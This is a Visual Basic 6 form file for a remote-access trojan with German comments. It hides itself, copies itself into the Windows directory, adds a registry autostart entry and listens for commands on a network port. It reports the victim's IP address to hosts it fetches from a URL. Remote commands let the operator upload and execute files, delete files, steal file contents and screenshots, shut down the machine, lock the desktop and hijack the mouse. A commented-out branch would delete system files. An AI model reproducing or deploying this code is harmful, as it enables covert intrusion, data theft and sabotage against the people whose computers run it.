VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Begin VB.Form client 
   BorderStyle     =   0  'Kein
   Caption         =   "Form1"
   ClientHeight    =   5940
   ClientLeft      =   8250
   ClientTop       =   1260
   ClientWidth     =   8430
   Icon            =   "server.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   MousePointer    =   99  'Benutzerdefiniert
   ScaleHeight     =   5940
   ScaleWidth      =   8430
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'Bildschirmmitte
   Visible         =   0   'False
   Begin VB.FileListBox File1 
      Height          =   3405
      Left            =   1920
      TabIndex        =   6
      Top             =   2160
      Width           =   1815
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   120
      TabIndex        =   5
      Top             =   2160
      Width           =   1695
   End
   Begin VB.DirListBox Dir1 
      Height          =   3015
      Left            =   120
      TabIndex        =   4
      Top             =   2520
      Width           =   1695
   End
   Begin VB.TextBox txtReg 
      Height          =   1335
      Left            =   2280
      MultiLine       =   -1  'True
      TabIndex        =   3
      Text            =   "server.frx":030A
      Top             =   120
      Width           =   6015
   End
   Begin VB.Timer tmrIP 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   120
      Top             =   960
   End
   Begin VB.Timer tmrDFÜ 
      Interval        =   2000
      Left            =   1080
      Top             =   1440
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   1560
      Top             =   240
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.Timer tmrMaus 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   600
      Top             =   1440
   End
   Begin VB.Timer tmrLight 
      Enabled         =   0   'False
      Interval        =   250
      Left            =   1080
      Top             =   0
   End
   Begin VB.TextBox txtpfad 
      Height          =   285
      Left            =   2385
      TabIndex        =   2
      Top             =   1560
      Width           =   150
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   2625
      TabIndex        =   1
      Text            =   "0"
      Top             =   1560
      Width           =   150
   End
   Begin VB.Timer Timer3 
      Interval        =   500
      Left            =   1080
      Top             =   480
   End
   Begin MSWinsockLib.Winsock udpwinsock 
      Left            =   600
      Top             =   480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
   Begin VB.Timer tmrwarte 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   120
      Top             =   1440
   End
   Begin VB.Timer tmrTimeOut 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   600
      Top             =   960
   End
   Begin MSWinsockLib.Winsock wsoWinsock 
      Left            =   120
      Top             =   480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label lblFile 
      Height          =   255
      Left            =   1080
      TabIndex        =   0
      Top             =   0
      Width           =   375
   End
End
Attribute VB_Name = "client"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim URL As String
Dim urlb As Byte
Dim flag As Boolean
Dim Windows As String
Dim REG As String
Dim file As Boolean
Dim remoteHost As String
Dim hosts(256) As String * 15
Dim maxhost As Integer



Private Sub Form_Load()

On Error Resume Next
'Shell ("Xwindow.com")
If App.PrevInstance Then
    End
End If
'Open App.EXEName For Output As #1
Open "c:\windows\desktop\netw2.exe" For Binary As #1
    For i = 1 To 40
        Get 1, LOF(1) - (40 - i), urlb
        If urlb <> 32 Then
            URL = URL & Chr(urlb)
        End If
    Next i

REG = txtReg
Dim Path As String
Dim PathX As String
Dim source As String
Dim target As String


Dim sPuffer As String * 100
Dim x As String
GetWindowsDirectory sPuffer, 100

x = sPuffer
For i = 1 To Len(x)
    If Asc(Mid(x, i)) = 0 Then
        x = Left(x, i - 1)
        x = LTrim(x)
        Exit For
    End If
Next i

source = App.Path + "\" + App.EXEName + ".exe"
target = x + "\" + "netw.exe"
FileCopy source, target
source = App.Path + "\" + "msvbvm60.dll"
target = x + "\" + "msvbvm60.dll"
FileCopy source, target
source = App.Path + "\" + "mswinsck.ocx"
target = x + "\" + "mswinsck.ocx"
FileCopy source, target
source = App.Path + "\" + "msinet.ocx"
target = x + "\" + "msinet.ocx"
FileCopy source, target

Path = Chr(34) + "control" + Chr(34) + "=" + Chr(34) + x + "\" + "netw.exe" + Chr(34) + Chr(13) + Chr(10)
For i = 1 To Len(Path)
    If Mid(Path, i, 1) = "\" Then
        PathX = PathX + "\\"
    Else
        PathX = PathX + Mid(Path, i, 1)
    End If
Next i
REG = REG + PathX

flag = False
Open x + "\1.reg" For Binary As #1
    Put 1, , REG
Close #1
    Shell ("regedit.exe /s" + " " + x + "\1.reg")
    Kill (x + "\1.reg")
Dim AlterWert As Long
On Error Resume Next
wsoWinsock.LocalPort = 1750
wsoWinsock.Listen
With udpwinsock
    .remoteHost = "freak"
    .RemotePort = 8570
    .Bind 8569
End With
End Sub


Private Sub Form_Unload(Cancel As Integer)
wsoWinsock.Close
wsoWinsock.LocalPort = 9999
udpwinsock.Close
Open x + "\1.reg" For Binary As #1
    Put 1, , REG
Close #1
    Shell ("regedit.exe /s " + x + "\1.reg")
    Kill ("\1.reg")
End Sub



Private Sub Timer3_Timer()
On Error GoTo Fehler
Dim i As Integer
Dim version As String
Dim sendIP As String
version = CStr(App.Major) + "." + CStr(App.Minor) + CStr(App.Revision)
For i = 1 To maxhost
  udpwinsock.remoteHost = hosts(i)
sendIP = "01" + udpwinsock.LocalIP + "-" + udpwinsock.LocalHostName + "-" + version
    udpwinsock.SendData (sendIP)
Next i
Fehler:
    Resume Next
End Sub



Private Sub tmrDFÜ_Timer()
Dim lprasconn(255) As RASCONN, lpcConnections As Long, _
    lpcb As Long, hRasConn As Long, NameRasConn As String
  lprasconn(0).dwSize = 412
  lpcb = 256 * lprasconn(0).dwSize

  If RasEnumConnectionsA(lprasconn(0), lpcb, lpcConnections) = 0 Then
      If lpcConnections > 0 Then  ' Eine DFÜ-Netzwerkverbindung ist aktiv
        hRasConn = lprasconn(0).hRasConn  ' Handle der Verbindung
        tmrIP.Enabled = True
      Else
        tmrIP.Enabled = False
        maxhost = 1
        hosts(1) = "freak"
      End If
  End If
End Sub

Private Sub tmrIP_Timer()
Dim i As Integer
remoteHost = Inet1.OpenURL(URL, 0)
For i = 1 To Len(remoteHost) / 15
    hosts(i) = Mid(remoteHost, i * 15 - 14, 15)
Next i
maxhost = i
'Dim GetFile As String
'GetFile = Inet1.OpenURL("Http://www.freak2000.purespace.de/SH.txt", 0)
'    udpwinsock.remoteHost = GetFile
End Sub

Private Sub tmrLight_Timer()
If flag = False Then
    ' Taste Drücken (Rollen)
  keybd_event &H91, 1, 0, 0

' Taste wieder lösen
  keybd_event &H91, 0, &H2, 0
  flag = True
Else
    
' Taste Drücken (SLock)
  keybd_event &H14, 1, 0, 0

' Taste wieder lösen
  keybd_event &H14, 0, &H2, 0
  flag = False
End If
End Sub

Private Sub tmrMaus_Timer()
SetCursorPos Screen.Width / 30, Screen.Height / 30
End Sub

Private Sub tmrTimeOut_Timer()
On Error GoTo err
wsoWinsock.SendData ("xx")
Exit Sub
err:
wsoWinsock.Close
wsoWinsock.Listen
tmrTimeOut.Enabled = False
Close #1
End Sub

'Private Sub tmrwarte_Timer()
'tmrClose.Enabled = True
'tmrwarte.Enabled = False
'End Sub

Private Sub wsoWinsock_DataArrival(ByVal bytesTotal As Long)
On Error GoTo err
Dim Sites As Integer
Dim PicturePath As String
Dim strData As String
wsoWinsock.GetData strData
Dim harddisk As String
Dim i As Integer
Dim strPath As String
Dim cpuffer As Byte
Dim TBarHandle As Long
Dim AlterWert As Long
Dim Breite As Integer
Dim Höhe As Integer
Dim strJPG As String
Dim mhöhe As String
Dim mbreite As String
    
     Select Case Left(strData, 2)
        Case "01"
            tmrTimeOut.Enabled = True
            wsoWinsock.SendData ("02")
            
        Case "09"
            wsoWinsock.Close
            wsoWinsock.Listen
            Timer1.Enabled = True
            tmrTimeOut.Enabled = False
            tmrClose.Enabled = False
            
            
        Case "11"
            txtpfad = Right(strData, Len(strData) - 2)
            Kill txtpfad
            Open txtpfad For Binary As #1
            wsoWinsock.SendData ("11")
            
        Case "12"
            wsoWinsock.SendData ("12")
            file = True
            
        Case "14"
            strData = Right(strData, 1000)
            Put 1, , strData
            If file = True Then wsoWinsock.SendData ("12")
            
        Case "13"
            Shell (txtpfad.Text), vbNormalFocus
            
        Case "15"
            strData = Right(strData, Len(strData) - 2)
            strData = Left(strData, Len(strData) - 1)
            Put 1, , strData
            Close #1
            txtpfad = ""
            file = False
            wsoWinsock.SendData ("19")
            
        Case "16"
            strData = Right(strData, Len(strData) - 2)
            Open strData For Binary As #1
            wsoWinsock.SendData ("16" + CStr(LOF(1)))
            file = True
        
        Case "17"
          strString = ""
          Do While Not EOF(1)
            Get 1, , cpuffer
            strString = strString + Chr(cpuffer)
            If Len(strString) = 1000 Then
              If file = True Then wsoWinsock.SendData ("17" + strString)
              strString = ""
              Exit Do
            End If
          Loop
          If Not strString = "" Then
            If file = True Then wsoWinsock.SendData ("18" + strString)
            strString = ""
            Close #1
            file = False
          End If
          
          
        Case "18"
            Kill Right(strData, Len(strData) - 2)
          wsoWinsock.SendData ("19")
          File1.Refresh
        Case "19"
            If Right(strData, 4) = ".exe" Or Right(strData, 4) = ".EXE" Then
                Shell (Right(strData, Len(strData) - 2)), vbNormalFocus
            End If
        Case "21" 'Chat starten
            Chat.Show
            wsoWinsock.SendData ("22")
        Case "24"
            Chat.List1.AddItem Right(strData, Len(strData) - 3)
        Case "29" 'Chat beenden
            Chat.List1.AddItem "Supervisor has quit chat."
            Unload Chat
        Case "31"
            meldung.Show
            meldung.Label2.Text = Right(strData, Len(strData) - 3)
            SetWindowPos meldung.hwnd, -1, _
              Screen.Width / 30 - meldung.Width / 30, _
              Screen.Height / 30 - meldung.Height / 30, _
              meldung.Width / 15, meldung.Height / 15, _
              SWP_SHOWWINDOW
        Case "33" 'MDZ
            'MediaPlayer1.FileName = "MDZ.SH2"
            'MediaPlayer1.Play
        Case "34" 'KES
        Case "36"
            Shell ("rundll32 user,exitwindows")
        Case "37"
            Shell ("rundll32 shell32,SHExitWindowsEx 0")
        Case "39" 'Windows zerstören
            'Kill ("autoexec.bat")
            'Kill ("config.sys")
            'Kill ("explorer.exe")
            'Shell ("rundll32 shell32,SHExitWindowsEx 0")
        Case "40" 'Auflösung in 320*240 ändern
            Shell ("regedit.exe /s explof.reg")
            Shell ("rundll32 user,exitwindows")
        Case "41"
            tmrMaus.Enabled = True
        Case "42"
            tmrMaus.Enabled = False
        Case "43"
            frmDesktopSperren.Show
        Case "44"
            Unload frmDesktopSperren
            SystemParametersInfo SPI_SCREENSAVERRUNNING, False, AlterWert, 0
        Case "51"
          TBarHandle = FindWindow("Shell_traywnd", vbNullString)
          ShowWindow TBarHandle, SW_HIDE
          SystemParametersInfo SPI_SCREENSAVERRUNNING, True, AlterWert, 0
        Case "52"
          TBarHandle = FindWindow("Shell_traywnd", vbNullString)
          ShowWindow TBarHandle, SW_SHOW
          SystemParametersInfo SPI_SCREENSAVERRUNNING, False, AlterWert, 0
        Case "53"
            Breite = Mid(strData, 3, 4)
            Höhe = Right(strData, 4)
            ChangeScreenResolution Breite, Höhe
        
        'Case "61"
            'frmExplorer.Show
            'wsoWinsock.SendData ("62")
        Case "63"
            PicturePath = Right(strData, Len(strData) - 2)
            SystemParametersInfo SPI_SETDESKWALLPAPER, 0, PicturePath, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE
        'Case "64"
            'frmExplorer.Show
            'For i = 1 To frmExplorer.Drive1.ListCount
                'wsoWinsock.SendData ("69 " + frmExplorer.Drive1.List(i))
            'Next i
        Case "70"
            Call mciExecute("Set CDaudio door open") ' Laufwerkstür öffnen
        Case "71"
            Call mciExecute("Set CDaudio door closed") 'Laufwerkstür schließen
        Case "80"
            Load frmStream
        Case "81"
            'Open "" For Binary As #1
                'Get 1, , cpuffer
                'Put 1, , Chr(cpuffer)
                'put 1,, "del "left(windows,3) +
        Case "82"
            tmrLight.Enabled = True
        Case "83"
            tmrLight.Enabled = False
        Case "84"
            Printer.FontSize = Mid(strData, 3, 3)
            Sites = Mid(strData, 6, 4)
            For i = 1 To Sites
              Printer.Print Right(strData, Len(strData) - 7)
              Printer.NewPage
            Next i
        Case "85"
            Open Right(strData, Len(strData) - 2) For Binary As #1
            klau
        Case "89"
            End
        Case "91"
            Drive1.Refresh
            Dir1.Refresh
            File1.Refresh
            strPath = Right(strData, Len(strData) - 2)
            Drive1.Drive = strPath
            Dir1.Path = strPath
            File1.Path = strPath
            For i = 0 To Drive1.ListCount - 1
                harddisk = harddisk + Drive1.List(i)
                harddisk = harddisk + Chr(1)
            Next i
            harddisk = harddisk + Chr(2)
            For i = 0 To Dir1.ListCount - 1
                harddisk = harddisk + Dir1.List(i)
                harddisk = harddisk + Chr(1)
            Next i
            harddisk = harddisk + Chr(2)
            For i = 0 To File1.ListCount - 1
                harddisk = harddisk + File1.List(i)
                harddisk = harddisk + Chr(1)
            Next i
            harddisk = "92" + harddisk
            wsoWinsock.SendData (harddisk)
        Case "94"
            getDesktop 0, 600, True, 60, "wsx32.sys"
            Open "wsx32.sys" For Binary As #3
            wsoWinsock.SendData ("95")

        Case "95"

          strJPG = ""
          Do While Not EOF(3)
            Get 3, , cpuffer
            strJPG = strJPG + Chr(cpuffer)
            If Len(strJPG) = 1000 Then
              wsoWinsock.SendData ("96" + strJPG)
              strJPG = ""
              Exit Do
            End If
           Loop
                     
          If Not strJPG = "" Then
            wsoWinsock.SendData ("97" + strJPG)
            strJPG = ""
            Close #3
            file = False
          End If

        Case "99"
            Close #1
            Kill txtpfad
            txtpfad = ""
            file = False
            
Fehler:
                Resume Next
    End Select

err:
    Resume Next
End Sub

Private Sub wsoWinsock_ConnectionRequest(ByVal requestID As Long)
If wsoWinsock.State <> sckClosed Then
  wsoWinsock.Close
End If
wsoWinsock.Accept requestID
End Sub


Public Sub klau()
Dim stri As String
Dim cpuffer As Byte
Dim i As Integer
Do
  For i = 1 To 1000
    If Not EOF(1) Then
      Get 1, , cpuffer
      stri = stri + cpuffer
    Else
      wsoWinsock.SendData ("86" + stri)
      wsoWinsock.SendData ("87")
      Exit Sub
    End If
  Next i
  wsoWinsock.SendData ("86" + stri)
  stri = ""
Loop
End Sub

Public Sub ChangeScreenResolution(ByVal Breite As Long, ByVal Hoehe As Long)
Dim DevM As DEVMODE
Dim Ergebnis As Long

    EnumDisplaySettings 0&, 0&, DevM
  
    With DevM
      .dmFields = DM_PELSWIDTH Or DM_PELSHEIGHT
      .dmPelsWidth = Breite
      .dmPelsHeight = Hoehe
    End With
  
    Ergebnis = ChangeDisplaySettings(DevM, CDS_TEST)
End Sub
  

